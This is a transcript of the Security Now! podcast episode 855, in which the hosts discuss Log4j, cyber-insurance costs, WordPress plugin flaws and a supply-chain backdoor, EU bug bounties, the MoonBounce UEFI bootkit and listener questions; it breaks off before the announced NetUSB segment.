If you want to watch us do the show live, we stream live at live.twit.tv, 24/7.  This show is every Tuesday, 1:30 Pacific, 4:30 Eastern, 21:30 UTC.  You can watch live, listen live, chat live at irc.twit.tv or in the Club TWiT Discord server, which is a lot of fun to be in there.  And I think that pretty much covers it all.  We'll be back next Tuesday with another thrilling, gripping edition of Where the Hackers Are.



STEVE:  Right-o.



LEO:  Thanks, Steve.  We'll see you next time.



STEVE:  Thanks, buddy.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#855

DATE:		January 25, 2022

TITLE:		Inside the NetUSB Hack

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-855.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we briefly touch on the ongoing Log4j background noise.  We look at the result of the insurance industry's pushback against ransomware coverage and at the resulting changing cyber-insurance landscape.  We look at another WordPress add-on problem and a supply-chain attack on a very popular add-on provider.  We also wonder whether WordPress still makes sense in 2022.  We cover the EU's quite welcome major bug bounty funding, and Kaspersky's discovery of a very difficult to root out UEFI bootkit.  We'll share some interesting questions and topics suggested by our listeners.  Then we're going to take another of our recent technical deep dives to examine the precise cause of that pervasive NetUSB flaw.  It's really fun and completely understandable!



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here. Lots to talk about.	 We're going to briefly touch on Log4j and the background noise.  No big severe exploits that we know of yet.  But I guess that's only a matter of time.  A look at the insurance industry's pushback against ransomware coverage.  The EU's major bug bounty funding for a lot of open source projects.  And then Steve's going to look at a NetUSB flaw that involved a fairly simple programming error.  You might want to listen so you don't make the same mistake.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 855, recorded Tuesday, January 25th, 2022:  Inside the NetUSB Hack.



Yes, once again it's time for Security Now!.  You've been waiting all week for this guy right here, Steve Gibson, GRC.com.  Hello, Steve.



STEVE GIBSON:  Hey, buddy.  Great to be with you for the last podcast of January.  Where did the month go?  Next one will be February 1st.  We're going to have one of those earliest possible second Tuesdays of the month, two weeks from today.  It'll be the 8th for another Patch Tuesday adventure.



LEO:  They come so fast, don't they.



STEVE:  Oh, my.  I know.



LEO:  Seems like we just ate one.



STEVE:  They just keep giving so much joy to the world.  So this is Security Now! Episode 855 for the 25th of January titled "Inside the NetUSB Hack."  And you asked me before we began recording, is this the first time we've talked about NetUSB?  And it's funny that you should ask because in my doing some additional digging, I realized there had been a previous event with exactly the same kernel driver in Linux modems, and we titled a podcast, I think it was #508, NetUSB.  So indeed, this has been an ongoing problem.  I mean, it's been quiet for a long time.  But, okay.



The details of what the coder did is so interesting.  And it's not super crazy, like no one's going to be able to understand this.  And I just thought, you know, when I dug into it a little bit more, I thought, okay, I just have to share this with our listeners because it's a perfect example of how a mistake can get made, that you can look at the code, everything looks fine, the structure, the design, perfect.  But due to a little side effect which, you know, I mean, there were some things they could have done that would have prevented this from happening.  But it's just it's textbook classic mistake.  And so I thought, okay, that's just perfect for the podcast.



LEO:  Good, good, good.



STEVE:  So we're going to get to that.  But first we're going to briefly touch on the ongoing, I would call it Log4j background noise at this point.  Nothing cataclysmic happened in the last week, but there's little percolatings.  We're also going to look at the result of the insurance industry's pushback against ransomware, their insurance coverage of ransomware.  It's what we've been expecting.  And also the resulting sort of changing cyber-insurance landscape that is emerging as a result.  We're going to look at another WordPress add-on problem and a supply chain attack on a very popular add-on WordPress provider.  We're also wondering, as a result of this, whether WordPress still makes sense in the current day and age, in 2022.



LEO:  I am going to question you on that because these add-ons aren't official WordPress add-ons.  They're third-party add-ons.  Aren't they?



STEVE:  Correct.  But WordPress is built to support an add-on architecture.  The idea is that they deliberately, the WordPress people deliberately keep it rather feature sparse because the whole idea is to encourage an add-on ecosystem.  And I think that's the crux of the problem.  It was '03 it began, 19 years ago.  And it may have made sense back then.  I don't think that that model works in today's world.  Anyway, we'll talk about that.  We've also got the EU's quite welcome major bug bounty funding that they just announced last week.  Kaspersky's discovery of a very difficult to, well, root out UEFI, you'd really call it a bootkit rather than rootkit.  They found something that's interesting.



Also we've got, as I look through my recent Twitter transactions, there were some interesting questions and some topics suggested by our listeners.  And then we're going to have a really interesting and really, if people pay attention, everybody will understand this and kind of have this cool like aha moment where we really take a classic look inside a hack and that something that the designer of the NetUSB code missed, and it's probably been in there forever.



LEO:  Fun.  Can't wait.  Always enjoy that.  Know what not to do.



STEVE:  Yeah.



LEO:  Great.  We will get to the heart of the subject.  In fact, our Picture of the Week, which is a fun one.



STEVE:  So our Picture of the Week should strike fear in the heart of kids who have probably done this; and, on another level, coders who have done this.  What we're looking at is a large container with a divider separating into two halves.  On one half we have it filled with Mentos.  And on the other half it's filled with Coke.  Coca-Cola.  And so then there's a hand reaching down from off-screen, getting ready to lift and remove this divider which is currently, thankfully, separating the Mentos from the Coca-Cola.  Because we know what happens when you pull that divider out, and the Coca-Cola is able to mix with the Mentos.  You get an explosion.  And so this picture is titled "When you're gonna merge two branches after a long time."



LEO:  Oh, it's a git joke.  I get it.



STEVE:  It's a git joke, exactly.  For those who have not messed with source-level control, one of the things that can happen is with source code, a project with multiple files and such, is you can fork the source into a separate branch.  And then independently work on various aspects of the code.  But there are times when you may want to merge the different changes back into a single branch, essentially, back into a single set of files.



Well, the software to do this has been maturing over time, and it basically does what you'd expect it would do.  It looks at, given two different files, it looks at both files and, like, follows them along and waits until it sees that, wait, one of the files has changed in a certain way compared to the other.  And so it notices there's been a change, and then it continues looking down until it sort of like finds where they resynchronize again.  And so it's able to identify the location where that, like, which region of the source code is different from the other.  And then all things being correct...  



LEO:  Just push the button, and bazinga.



STEVE:  You hold your breath, and you smash them back together again. 



LEO:  The beauty of git is you can always get back to the previous setup, thank god.



STEVE:  Exactly.  You're able to roll back in time.  But anyway, but the idea is, if there were not many changes between the files being merged, your chances of creating a sane recombination are pretty good.  And this says when you are going to merge two branches after a long time.



LEO:  There are big differences, yeah.



STEVE:  Meaning lots of differences have occurred.  It's like, I don't know if we're going to - oh, especially if you get conflicting differences of the same region between the two pieces.  It's like, okay, now what are you going to do?



LEO:  A lot of text on the screen, let's put it that way.  A veritable fountain of Mentos.  You're kind of new to source code version control.  This is, since you set up that GitLab, how are you liking it?



STEVE:  Well, I'm not using it for that at all.



LEO:  Oh.  Oh.  Just for bug reporting.



STEVE:  It's just for issue tracking, yes.



LEO:  Yeah, yeah.



STEVE:  Yeah.  So I have long used something called FileBack PC, which is no longer being produced.  It allows...



LEO:  That means it's good, of course.  I mean...



STEVE:  Yeah, because it still works and, I mean, it's back almost from the DOS days.  It's got a very sophisticated set of, like, incremental backup management where, as I'm just working on my source code, not thinking about it, across multiple files, it's watching me do that and taking snapshots of my work periodically as things change.  And, I mean, and it's been super handy many times.  Now what I'm doing is, whenever I'm releasing a public build of SpinRite, I have just a batch file that zips all of my source into an archive and sort of, you know, like saves it at that point.  And that way, if somebody later says, hey, you know, everything was working until this version, I'm able to go, oh, and go back and take a look at what it was.



I also have a really cool Windows utility called Beyond Compare, which is a side-by-side, very smart Windows-based source comparison tool that I use often when I'm trying to understand what the differences are between two different files.  So anyway.



LEO:  Nice.



STEVE:  And I'm using Sync.  I've talked a lot about Sync.com.  They do like absolute version tracking, like every single time I save my source creates a checkpoint at Sync.com for that file.  And again, it's come in handy where I've wanted to roll back and grab a particular point in time.  Sync.com has them all.  So I've become a big fan of that.  And in fact I'm not using FileBack PC any longer because Sync.com just does everything and is also backing it up to the cloud and encrypting it and so forth.  And it gives me multiple site access, too.  So I'm able to get it from both locations.



LEO:  Yeah, I turn on versioning and sync, too, because that is a nice feature.  Even not for coding, yeah.



STEVE:  Okay.  So some Log4j news.  I didn't want to skip over anything important regarding Log4j this week.  And the good news is there was no clear Log4j-related disasters reported during the past week.  There was plenty of Log4j stirring, however.  Microsoft reported that the SolarWinds, we remember them from last year, their Serv-U servers were under a Log4j attack in a failed attempt at leveraging their support of the LDAP protocol.  As a consequence of the details, it wasn't actually possible to exploit them.  But the attacks failed.  Still they updated their Serv-U servers just to, like, in the interest of not being responsible for any more damage to the industry.  And Akamai reported seeing attacks aimed at Zyxel's networking gear.



In response, Zyxel has updated one of their products and posted, they said:  "Zyxel is aware of remote code execution vulnerabilities in Apache Log4j and confirms that among all its product lines, only NetAtlas Element Management System (EMS)" - whatever that is - "is affected."  They said:  "Users are advised to install the applicable updates for optimal protection."  So Zyxel did have something that was needing patching, and they've done that.  So it's mostly just kind of like that during the week.  No huge drama.  Just stirrings and rumblings and general indications of ongoing, largely behind-the-scenes work by many, I mean, everyone is scrambling to remediate that surprising discovery of such a widespread vulnerability.



The way "The Record" summed things up was to write:  "While news cycles move fast from topic to topic, the situation around the Log4Shell exploit has not changed since last month, and the vulnerability is still heavily targeted and abused by threat actors seeking to enter corporate networks.  At the time of writing, there have been reports about threat actors such as ransomware gangs, nation-state cyberespionage groups, cryptomining gangs, initial access brokers, and DDoS botnets, all of which are now using the vulnerability in their operations."



So, you know, all of the usual suspects jumped on this quickly, and all of their various operations acquired yet another means for remotely penetrating networks.  We know what the shape of the patch curve looks like.  I'm sure 90% of the problems that were publicly present are resolved by this time.  It's been nearly two months since early December when this all began.  Yet there will be that remaining 10%, probably never get patched.  And I'm pretty sure they're probably all well infested by this point.  



Okay.  So who pays for ransomware attack recovery?  I just personally find the topic quite interesting since one of the targeting parameters which we know from some dialogues that were shared, we know that the parameter used by attackers has been their victims' ability to pay.  Right?  The whole point is getting paid.  And so it doesn't make any sense to pay to attack somebody who has no money or who isn't going to be able to pay.  And since in the case of many public and private targets, their cyber-insurance has been the actual source of ransomware payment and then post-attack recovery funding, insurance sort of is in this cross-hairs.



Back four years ago, in June of 2017, and I remember we talked about this at the time, Leo, the pharmaceutical giant Merck was hit by the NotPetya ransomware in what was really a surprisingly devastating cyberattack.  Four years ago, so that was before the current surge, and NotPetya was one of the early ones.  And the attack was apparently quite devastating, with Merck claiming that the data on more than 40,000 Merck computers was destroyed.  At the time, Merck estimated the damage from this one attack at $1.4 billion, a quite sizeable loss resulting from production outage, costs to hire IT experts, and costs of buying new equipment to replace apparently all affected systems.



And as I said, we discussed it at the time, and I remember you, Leo, wondering about the size of that number, you know, it's like, whoa.  First of all, 40,000 computers?  What, are you going to replace every single one?  I mean, it sort of seemed like a, I don't want to say a scam, but like they were going to get a nice ride out of their insurance policy if they could.  You know.  And certainly it seems a bit steep.  In any event, Merck was quite well insured, carrying a $1.75 billion "all risk" insurance policy. 



LEO:  It probably didn't say ransomware then because it was so uncommon; right?  It was just...



STEVE:  Correct, correct.  



LEO:  Yeah.



STEVE:  But there was some cyber coverage.  It included coverage for software-related data loss events.  So at that point, sort of generic.  Merck's insurer, Ace American, wasn't happy about the idea of paying out $1.4 billion.



LEO:  No, really?



STEVE:  Oh.  You'd like all new computers?  You'd like 40,000 new PCs?  Is that right?  Oh.  So they refused to cover the losses, citing that the NotPetya attack was part of Russian hostilities against Ukraine.



LEO:  Yeah, I remember this, yeah, yeah.



STEVE:  Uh-huh.  And as a result was subject to the "Acts of War," again in quotes, that is an exclusion clause in insurance policy contracts, the Acts of War exclusion clause which is standard boilerplate present in most, as I said, insurance contracts.  So Merck sued Ace American in November of 2019, arguing in court that the attack was not an "official state action," hence the Acts of War clause should not apply.  Merck's attorneys argued that the exclusion clause contained language that limited the Acts of War to official government agencies and did not specifically mention cyber-related events.  And as a result, the Act of War exclusion clause should not apply to their customer.



Okay.  This popped back into the news last week after a court in New Jersey agreed with what seemed rather clear-cut language in the agreement, ruling in favor of Merck.  Judge Thomas J. Walsh wrote in an opinion justifying his ruling, he said:  "Given the plain meaning of the language in the exclusion, together with the foregoing examination of the applicable case law, the court unhesitatingly finds that the exclusion does not apply."  The judge argued that despite knowing that cyberattacks can be acts of war, Ace American did not move to update the language in its exclusion clauses.  He said:  "Certainly they had the ability to do so.  Having failed to change the policy language, Merck had every right to anticipate that the exclusion policy applied only to traditional forms of warfare."



So that set some additional case law.  And although the case wasn't mainstream news, the insurance industry has been watching it closely, and it has had a large impact and has been having a large impact on the cyber-insurance business, with several major insurers updating the language of their Acts of War exclusion clauses, the latest being Lloyd's, which updated their language just a few days before the court's ruling.  So the Merck case is attention-grabbing due to the amount of money involved, certainly.  But there have been a great many lower profile lawsuits brought by ransomware victims in the last couple years, and those cases have also largely been won.  The insurance companies are not happy, and they're responding.  Which brings us to the other thing I wanted to talk about, the rising cost  of cyber-insurance.



The Suburban School Cooperative Insurance Program (SSCIP) is an insurance pool designed to allow school districts to join together, sort of in a collective bargaining way, to negotiate better insurance rates and lower management fees.  One of the school districts participating in this co-op program is the Bloomington School District 87 in Chicago, Illinois.  That school district recently published its cyber-insurance renewal details, which caught some of the tech press's eye.  They reported that their cost jumped in one year from what it had been, $6,661 in 2021, to $22,229 for 2022, 334% of the previous year.  And in fact the cooperative was apparently fortunate to even get that.  In their memo, the district noted that:  "In light of events that have negatively impacted the cyber-insurance market, SSCIP was unable to initially find the required coverage for the group.  After a small delay, the cooperative was ultimately able to secure an insurer willing to accept the risks of the pool."



Emsisoft recently published a summary of ransomware attacks in 2021.  I mean, that's just a report begging to be written.  Wouldn't be very difficult; right?  Just play back this podcast for the year of 2021.  They wrote:  "Predictably, 2021 was largely a replay of the previous two years, with the U.S. public sector again experiencing a barrage of financially motivated ransomware attacks.  The attacks impacted a total of 2,323 local governments, schools, and healthcare providers."  The breakdown was 77 state and municipal governments and agencies, 1,043 schools, and 1,203 healthcare providers.



An interesting bit of the memo published by District 87, talking about their cyber-insurance coverage, indicated that the districts participating in the cooperative insurance policy would be required to do more than just make their payment premiums or premium payments.  To qualify for this coverage, the districts would also be required to fully implement multifactor authentication for all logins across all of their accounts.  And interestingly, until that was done, the insurance coverage limits would remain low.  So the insurer is saying, okay, here's the price.  We're not going to, like, give you full coverage until you can assert that you have taken the steps of implementing multifactor login authentication for every login you have.



Once that's done, and they're expecting to be able to do that by the end of March, then you get the full coverage that you're paying for.  Which I thought was interesting.  As we know, in the Log4j world, adding multifactor authentication to logins won't help, right, since the bad guys are crawling in through the backdoor rather than guessing the authentication protecting the front door.  But adding multifactor authentication where it's been absent before, which was probably everywhere, would certainly remove the lowest hanging fruit.  And I would argue that certainly provides significant protection.  Overall, though, as we expected to see, the cost of cyber-insurance coverage is predictably increasing significantly across the board for anyone who needs it.  Yikes.



And we have to talk about, and this leads us to some discussion again, about WordPress.  The guys at WordFence have uncovered another very critical - this one's a CVSS of 8.3 - flaw in a WordPress add-on named "WP HTML Mail."  WP HTML Mail is an email template designer used for designing custom email.  Unfortunately, its use is currently exposing more than 20,000 WordPress sites that use it to malicious code injection, phishing scams, and more.



The root of the problem is a faulty configuration, well, which is putting it kindly, in the REST-API routes used to update the template and change settings.  I say it's putting it kindly because there is no authentication at all required to access the REST-API endpoint.  Consequently, any user, I mean, like anyone on the Internet, has access to execute the REST-API endpoint to save or retrieve an email's theme settings.  This would allow the injection of malicious JavaScript into the mail template that would execute anytime a site admin accessed the HTML mail editor.  Okay.  So threat actors could add new users with admin credentials, inject backdoors, implement site redirects, and use legitimate site templates to send phishing emails, among many other things, basically a complete site takeover.



WordFence said that:  "Combined with the fact that the vulnerability can be exploited by attackers with no privileges on a vulnerable site, this means that there is a high chance that unauthenticated attackers could gain" - yeah, high chance - "could gain administrative user access on sites running the vulnerable version of the plugin when successfully exploited."  As I said, the plugin is installed on more than 20,000 sites and is compatible with other plugins run by WordPress sites with large followings like the ecommerce platform WooCommerce, online form builder Ninja Forms, and community builder plugin BuddyPress.



WordFence noted in their disclosure:  "We recommend that WordPress site owners immediately verify that their site has been updated to the latest patched version available, which is version 3.1 at the time of this publication."  And for what it's worth, this latest disclosure comes just a week after the firm known as Risk Based Security published their findings that the number of WordPress plugin vulnerabilities exploded by triple digits in 2021.  And all of our listeners know it's a constant topic here just because this is such a problem.  And as we mentioned just last week, remember, three different WordPress plugins, all written by the same author, were reported with the same bug, exposing 84,000 sites running ecommerce add-ons to full site takeovers.



So is anyone here noticing a worrisome trend with WordPress? I'm certain that the developers of these plugins have the best of intentions.  But as we're going to see in detail at the end of today's podcast, writing secure code is surprisingly difficult.  Now, I don't excuse somebody who doesn't even add authentication to the REST-API used for configuring his plugin and the templates that it uses.  That's inexcusable.  I mean, that's just, like, no security whatsoever.  And the problem is most developers stop their work the moment their code starts to work.  But that often means that the security of that code, as a vital aspect of it, is barely, if ever, considered.



Okay.  So on top of all that we had a supply chain attack on a popular WordPress add-on provider.  You know, it's bad enough when plugin authors who are untrained in security coding make mistakes.  That's not good.  But when deliberately malicious actors are able to get their malicious code into widespread and popular add-ons, things get much worse. In this case, threat actors were able to compromise 40 themes and 53 plugins all belonging to AccessPress, a developer of very popular WordPress add-ons which are used by over - sit down - 360,000 active WordPress sites.  There's like 800 and some thousand, more than that, but this is more than a third of all WordPress sites used themes and plugins from AccessPress.  So, yeah. 



The guys at Jetpack, who are professional WordPress developers, explained their discovery.  They said:  "While investigating a compromised site, we discovered some malicious code in a theme by AccessPress Themes, a vendor with a large number of popular themes and plugins.  Upon further investigation, we found that all the themes and most plugins from the vendor contained this suspicious code, but only if downloaded from their website.  The same extensions were fine if downloaded or installed directly from the WordPress.org directory."  Meaning that they'd not been contaminated by this supply chain attack.



"Due to the way the extensions were compromised," they wrote, "we suspected an external attacker had breached the website of AccessPress in an attempt to use their extensions to infect further sites.  We contacted the vendor immediately, but at first we did not receive a response.  After escalating it to the WordPress.org plugin team, our suspicions were confirmed.  AccessPress websites were breached in the first half of September 2021, and every one of their extensions available for download on their site was injected with a backdoor.



"Once we had established a channel for communicating with the vendor, we shared our detailed findings with them.  They immediately removed the offending extensions from their website.  Most of the plugins have been updated," they concluded.  So anyway, I won't take up any more of our time on this specifically.  But I think that our constant Extinction Level Event reports about WordPress ought to give us some pause.



LEO:  Here's what I emphasize.  They're not about WordPress.  They're about WordPress plugins.  WordPress base code has always been secure.



STEVE:  Yes, that's exactly true.  I think it's becoming clear that WordPress, with its add-on ecosystem, made a lot more sense when it was initially released 19 years ago, back in 2003, than it does today.  And I agree with you, Leo.  There's no problem at all with WordPress itself.  So one thing people...



LEO:  Just be careful about what extensions you use, I guess.  I mean, you know...



STEVE:  Exactly.



LEO:  The thing is that it is totally dominant.  Half a billion sites are on WordPress.



STEVE:  Yes.



LEO:  I mean, it's by far number one.  I think it's almost half of the web.



STEVE:  Yes.  It is a...



LEO:  It makes it a target, for sure.



STEVE:  It's 39.5% of all Internet websites.  So, like, 40% of the Internet.  And as a CMS, a Content Management System, 62% of all CMS is WordPress.  And the number two in like a distant third is Shopify with 3.2%.  So I completely agree with you, Leo.  WordPress itself, the core, is solid.  Those guys are professional developers.  The problem, though, is that there's this, I mean, they...



LEO:  It's too easy maybe to make an add-on.  Maybe that's the problem.



STEVE:  That and, you know, because I was running WordPress for a while.  I had a blog there.  And what annoyed me was WordPress lacked really useful and important features. 



LEO:  Right.



STEVE:  And they know it.  They don't add features to their core product because they believe, and I think this is historically true, but not safe today, that, I mean, they're trying to encourage an add-on ecosystem.  The problem is it's just PHP.  And anybody can create an add-on.



LEO:  It's just too easy, yeah.



STEVE:  Yes.  And we know that security is really hard.



LEO:  Yeah.



STEVE:  And so basically what we end up with is just this constant problem, I mean, the WordFence guys, who have staked out WordPress security, they're busy because, you know, everywhere they look there's like this catastrophic tens of thousands of sites vulnerable to some add-on that, like, oh, look, how cool.  You know what, they're all free.  And, but, you know, they're a security catastrophe.



LEO:  Yeah.  They have, and I wonder how much they vet the plugins, I mean, you can get them officially from, as you pointed out, WordPress.org.



STEVE:  Yup.



LEO:  And I wonder how much security they do there.  I mean...  



STEVE:  Clearly they have no control over what, you know...



LEO:  Any third-party can - yeah, yeah, yeah.



STEVE:  Yeah.  So in a nice little bit of happy news, sort of following on what we were talking about last week about the need for providing more funding to do more of what we're already doing, the European Union has announced that it plans to fund some significant bug bounty programs.  There are five open source projects that are heavily used by public services across the EU.  Those are going to receive bug bounty funding.



Those five projects are LibreOffice, which as we know is a very good free open source alternative to Microsoft Office, with which it's often compared; Mastodon, which is the web-based system for hosting private social networks.  And Leo, I know you talk about Mastodon often.



LEO:  We have a Mastodon, twit.social, yup.



STEVE:  Yeah.  Odoo, which is an enterprise (ERP) you know, enterprise resource planning application, apparently very popular; CryptPad, an app for exchanging encrypted messages; and LEOS, L-E-O-S, which is software designed to help with drafting of legislation.



So the bug bounty program will run throughout this year, through 2022, on the Intigriti bug bounty platform, and the EU will provide a rewards pool of up to 200,000 euros, which is about $225,000 U.S.  Intigriti, whom we've never mentioned before, describes itself as "Europe's #1 ethical hacking and bug bounty platform."  They're I-N-T-I-G-R-I-T-I dot com.  So they're like HackerOne.  They have more than 300 active programs, more than 40,000 researchers hunting bugs with them, and more than 3 million euros have been paid to date.  So that's sort of the European equivalent.



Bug hunters will be eligible to earn as much as 5,000 euros, about $5,600, for finding and reporting "exceptional vulnerabilities," and are entitled to a 20% bonus on top of whatever they're awarded for the vulnerability if they provide a fix for it along with their report.  And, you know, having covered the recent problems with Microsoft patching against proofs of concept, rather than actually repairing the underlying problems, I think that this idea of also getting the fix from the same researcher who discovers the problem makes a great deal of sense.  Who better to understand the problem that they found than the researcher to suggest the proper way to fix it, and do it completely?



Now, admittedly, it's more feasible with open source projects than it is with closed-source environment like Windows.  But I just think that's a very sane perk to offer, you know, and who wouldn't go for it?  If you found the problem, you can certainly like, okay, hey, guys, you know, this should have been declared as a long instead of an int, you know, kind of thing.  So, I mean, not hard to figure that one out.



This new program was announced last week, and it's sponsored by the European Commission Open Source Programme Office (EC-OSPO), which is pretty new.  It was founded two years ago, in 2020.  It's the successor to one that we talked about before, FOSSA.  The EU-FOSSA was the Free and Open Source Software Auditing project, E-U-F-O-S-S-A.  And that was the organization through which the EU had previously funded two other bug bounty program initiatives for open source software, first in 2017 and then in 2018.



Back in 2017 the EU funded bug reports for VLC Player, my own preferred standalone video player.  And in 2018 this EU-FOSSA group sponsored bug reports for 14 projects:  7-zip, Apache Kafka, Apache Tomcat, Digital Signature Services, Drupal, Filezilla, FLUX TL, the GNU C Library, KeePass, midPoint, Notepad++, PuTTY, the Symfony PHP framework, and again the VLC Media Player and WSO2.  So they've done lots of good stuff in the past, and it looks like they're going to continue to be funding things that they see being necessary and of interest.  Oh, and I should mention that the same program also funded security audits for the Apache HTTPD web server and KeePass, the password manager.



So a huge yay to all of this.  It would be great to see more of this same thing and more in coming years.  And as I said last week, the industry I think is already doing many things that make a great deal of sense.  We just need more of what we're already doing.  And some of that needs some money.  So tip of the hat to the EU, and it would be great if the U.S. White House and admin would arrange to do something to provide similar funding.



In the fun name of the week we have MoonBounce.  It's the name given to an EFI bootkit.  UEFI was designed from the beginning deliberately to be a secure and securable boot platform foundation for next-gen firmware for motherboards.  Unfortunately, every day it's looking less and less like it's going to meet that mark.  Last Thursday researchers at Kaspersky Labs disclosed their discovery of yet another novel UEFI  bootkit which can infect a computer's UEFI firmware.



Okay.  So what makes MoonBounce, as Kaspersky named it, special is that unlike some previous pre-boot malware, this one doesn't hide inside the hard drive's EFI System Partition, the so-called ESP.  That's where most UEFI malware tucks itself.  Instead, it arranges to infect the so-called "SPI memory" that's found on the motherboard.  SPI is the Serial Peripheral Interface.  And it's in fact, it's the way you could have a flash memory which is this little itty-bitty chip with, like, six leads on it.  You just need to give it power and serial data and clock, and it's able to do the rest.  So you'd hardly even know it was there.  And that gets loaded into the chip at boot time in order to provide the processor that's running on the baseboard of its firmware.



So consequently, as a consequence of the fact that it's actually in this little flash chip, unlike other bootkits, defenders who are trying to prevent this stuff from getting them cannot shake this one off by reinstalling the operating system or even by replacing the hard drive.  This pernicious bootkit will continue to remain on the infected device until the motherboard's SPI memory is re-flashed to clean it out, or the motherboard's replaced.  And according to Kaspersky, MoonBounce is not even the first UEFI bootkit they've seen that is able to infect and live inside SPI memory.  It's actually the third.  There was the first one was known as LoJax, L-O-J-A-X, and then the second was MosaicRegressor.



And sadly, all indications are that UEFI bootkits are proliferating.  Recent months have uncovered something known as ESPectre, E-S-P-E-C-T-R-E, ESP of course as in EFI System Partition.  So that's one that does live on the hard drive in the ESP partition.  And FinSpy also has a UEFI bootkit, and there are others.  Kaspersky commented in their report that what was once considered unachievable following the rollout of the UEFI standard, meaning it was unachievable to infect the EFI firmware, that's now becoming the norm as opposed to the exception.  Oh, and I also almost forgot to mention that MoonBounce has been directly attributed, that is, the creation of it, and actually the deployment where it was found to the Chinese government's state-sponsored hacking group, APT41.  So that's where that bad guy came from.



The good news is it's not being seen like sprayed or in some - anything that anybody's downloading.  It is being used in very highly targeted attacks.  So in this case there is some specific entity that the Chinese government or some branch of the government, whoever controls APT41 said we need to get inside these people.  And probably some research was done to find out what kind of hardware they're using.  And then something was designed specifically to get into that hardware.  On the other hand, we know that these things always start off a little more generically than they wind up.  I mean, they start off much more specifically in the beginning and then tend to become more generic over time, just as UEFI bootkits are no longer like a shock to anyone.  It's like, oh, yeah, okay.  What are we going to call this one?  How about MoonBounce?  No one's done that yet.  It's like, okay.



Okay, some feedback from our listeners.  I got a note asking, which I saw this morning, it said:  "Morning, Steve.  What do you use to run pfSense on?  I'm looking at switching to that from a UniFi security gateway."  Okay.  So we know that I run and like pfSense.  Actually it's sitting up above me.  It was right next to the cable modem which I rebooted.  Our listeners don't know, but we had a glitch just before we began recording the podcast.  My 'Net dropped offline, and I had to restart the cable modem.  Right next to it is a little Netgate SG-1100.  And I'm always conscious of the fact that those are my initials, so there's no relation.  Netgate SG-1100.  It is a cute little  prepackaged $189 three-interface router which comes preloaded with pfSense.



So you get it from Netgate.  I've got a link in the show notes, or just put Netgate.com into Google and you'll find it.  It's got a WAN port, a LAN port, and an OPT port.  And it does everything you could want because it's got pfSense in there.  One thing to be aware of with these little routers is it's one thing for them to say, oh, we've got GigE ports; right? We've got gig Ethernet ports.  But it matters how much processor is in there.  The original little box was the SG-1000, which had much less switching power than the SG-1100.



So this is the upgraded version.  They rate its routing capability at 880 mbps.  Firewall, which is going to slow it down because it's going to have to do some inspecting and filtering, that brings its routing to 656 mbps.  And it's able to host an IPSec VPN at 74.2 mbps.  So respectable performance.  I think I pay Cox for 300Mb downstream, and so this little box, if I run any kind of a speed test on my network I'm seeing that fully delivered bandwidth, which means it's getting all the way through the router down to my machine.



I have a different device in my other location, though, that I just kind of wanted to put on the map for people because I like it a lot.  It's from a company called Protectli, P-R-O-T-E-C-T-L-I.  And it's Protectli.com.  Basically their business is to produce little turnkey boxes, not preloaded with software, but very software agnostic.  They talk about there is actually a fork of pfSense called OPNsense, and it runs Linux, and it runs a bunch of third-party packages.  You can get it in 2-, 4-, and 6-port models.  And I should just mention, I skipped over the fact that that three ports is the key because as we've talked about before, unless your WiFi access point or WiFi router supports isolated guest networks, then you need to provide that yourself.  Or if you want to have a wired isolated guest network, as is possible, then you need a third interface, not just a switch on your router.  You need three separate interfaces so you can give them different firewall rules.



So anyway, Protectli has 2-, 4-, and 6-port models, and you're also able to pick the speed of the processor, the amount of RAM, the amount of storage.  Basically it's a little barebones, as it's called, you know, it's got the processor, but then you provide the RAM and mass storage, or you can get it from them, little fanless box that is just perfect for making little Internet appliances.  So anyway, that's how I'm running Netgate, or running pfSense, rather, Netgate here and a Protectli box at my other location.



And just following up on our discussion last week, Leo, about refilling SodaStream cans, Peter Crocker, he was listening to our conversation.  He said:  "The big tanks need to be tested every five years in a hydrostatic test."  He said:  "Basically a requirement of any pressure cylinder like welding gas, scuba tank, or CO2."  He said:  "Then they stamp it with a new date.  Most places," he says, "send it away for the test."  And he said:  "In terms of filling the big tanks, they need to be cold and filled slowly, so often not a service you wait for, hence some exchanging if you want it right away."



And I did mention that one of the things that I noticed when my big tank was last refilled, this is on my mind because it was only a couple weeks ago, is he opened the tap and expelled the CO2.  Now, you might at first thing, whoa, wait a minute, he's wasting gas; right?  He's like letting it out.  No.  He's running like the basis of an air conditioner.  He's expanding the gas which is pulling heat out of the cylinder.  And it ends up cooling it off, which is exactly as Pete says, the way you want to refill it.



So when I was talking about one of my tips for refilling the SodaStream canisters, what we do is keep them frozen until I screw them onto the big tank and then refill.  Similarly, you'd like to have any tank receiving CO2 be as cold as it can get it.  So they do what they can to cool off the recipient tank actually by blowing the CO2 out of it, which brings its temperature way down.



Paul Walker, he said:  "Hey, Steve, have you considered updating ShieldsUP! so it can scan the full port range at once?  Just been listening to Episode 854 where you talk about port 20005.  If we could scan the entire range, it might help preempt things like this."  And Paul, I completely agree.  I remember, and Leo, you and I were talking about this at the time, remember I used to be connected to the Internet by a pair of T1s.



LEO:  Yeah, yeah.  And that was when it was cool.  Yeah, wow.



STEVE:  And that was when it was like, that was like, whoa.  You've got T1s?  Hey.  The problem was they were, what was it, 1.54Mb, I think, each.  So I had them paired so I could get like a little over 3Mb of total upstream - I guess they were symmetric, so it was bidirectional.  Yeah, it was 1.54Mb in both directions.  And GRC was here, like in this room that I'm talking from right now.  That is, the GRC server was sitting on a table to my side with a UPS next to it.  You know, those were the days.  The problem was...



LEO:  Those were the days.  3Mb, ooph.



STEVE:  That's right.  The problem was I was worried about saturating my own bandwidth with TCP SYN packets because if I couldn't get them out, then they wouldn't bounce off of the far end's IP whatever it was, router or machine or whatever, and then get SYN ACKs back to me to sense that ports were open.  So the point is I could be producing false positive stealths or false positive closes, that is, not seeing a SYN ACK return if the problem was at my end rather than at their end.  So I deliberately, I did a couple things.  I deliberately limited the number of ports that I was scanning, and I throttled them out so they wouldn't be bunched up.



